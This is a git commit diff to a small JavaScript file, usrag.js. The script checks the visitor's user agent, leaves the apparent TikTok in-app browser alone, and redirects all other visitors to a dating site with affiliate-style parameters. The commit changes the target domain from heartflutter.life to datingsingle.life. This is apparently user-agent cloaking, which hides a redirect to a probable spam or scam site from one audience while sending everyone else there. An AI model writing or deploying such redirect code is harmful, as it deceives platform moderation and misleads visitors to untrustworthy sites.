ff4bbeda0b056bd56b6b8f2c6c12d3ee9a6d1936
FixYourSelf1 <72053190+FixYourSelf1@users.noreply.github.com>
2024-05-11 05:32:23 +0300

    Update usrag.js

--- usrag.js
+++ usrag.js
@@ -3,7 +3,7 @@ let agent = navigator.userAgent;
 if (agent.indexOf('music') >= 0) {
   console.log('in tiktok app');
 } else {
-  window.location = 'https://heartflutter.life/?u=rudktec&o=9kgp9mx';
+  window.location = 'https://datingsingle.life/?u=rudktec&o=9kgp9mx';
 //  window.location = 'https://github.com/FixYourSelf1/watchme';
 }
 // document.querySelector('body').innerText = agent;
